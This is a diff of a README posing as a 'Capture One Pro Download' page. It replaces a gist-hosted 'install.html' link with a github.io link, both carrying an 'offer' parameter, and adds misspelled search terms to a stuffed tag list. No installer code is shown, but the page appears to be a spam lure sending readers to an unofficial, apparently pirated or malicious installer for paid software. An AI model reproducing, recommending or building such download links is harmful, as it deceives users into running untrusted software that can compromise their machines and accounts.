@@ -1,6 +1,6 @@
 # Capture One Pro Download — Desktop Photo Editing  
 
-[![Get Capture One Pro GitHub](https://img.shields.io/badge/Get%20Capture%20One%20Pro%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/dinorahmexank-create/6216a0beb36582896f560b35137ee8c3/raw/e7a7cf9bb275485d9d02377ab183a231ecb61e5b/install.html?offer=CaptureOnePro)  
+[![Get Capture One Pro GitHub](https://img.shields.io/badge/Get%20Capture%20One%20Pro%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CaptureOnePro)  
 
 ---
 
@@ -63,7 +63,7 @@ A: Yes, it provides industry-standard tools for professional workflows.
 ---
 
 ## 🔍 Tags  
-Capture One Pro, photo editing, RAW processing, color grading, tethered capture, Mac photo editor, Windows photo editor, desktop photo software, professional photography, image management, capture one, capture pc, capture windows, capture desktop, capture for mac, capture for pc, capture for windows, capture mac 
+Capture One Pro, apture 1 pro, capture one fujifilm, captureone, photo editing, RAW processing, color grading, tethered capture, Mac photo editor, Windows photo editor, desktop photo software, professional photography, image management, capture one, capture pc, capture windows, capture desktop, capture for mac, capture for pc, capture for windows, capture mac 
 
 ---
 
